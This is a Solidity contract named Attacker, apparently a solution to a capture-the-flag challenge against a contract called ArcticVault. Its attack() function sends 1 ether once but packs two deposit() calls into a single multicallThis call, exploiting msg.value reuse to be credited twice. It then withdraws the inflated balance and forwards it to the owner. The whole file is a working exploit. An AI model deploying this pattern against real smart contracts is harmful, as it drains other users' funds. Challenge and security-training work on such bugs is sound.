// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Challenge.sol";

contract Attacker
{
    address owner;
    ArcticVault target;

    constructor(address _target)
    { 
        target = ArcticVault(_target);
        owner = msg.sender;
    }

    function attack() external payable
    {
        //Require that 1 eth is sent with this
        require(msg.value == 1 ether, "You need to send 1 ether");

        //We need 2 calls to the deposit function
        bytes[] memory _data = new bytes[](2);
        _data[0] = abi.encodeWithSignature("deposit()");
        _data[1] = abi.encodeWithSignature("deposit()");

        target.multicallThis{value: 1 ether}(_data);

        //Withdraw the funds
        target.withdraw();

        //Send funds to the owner
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}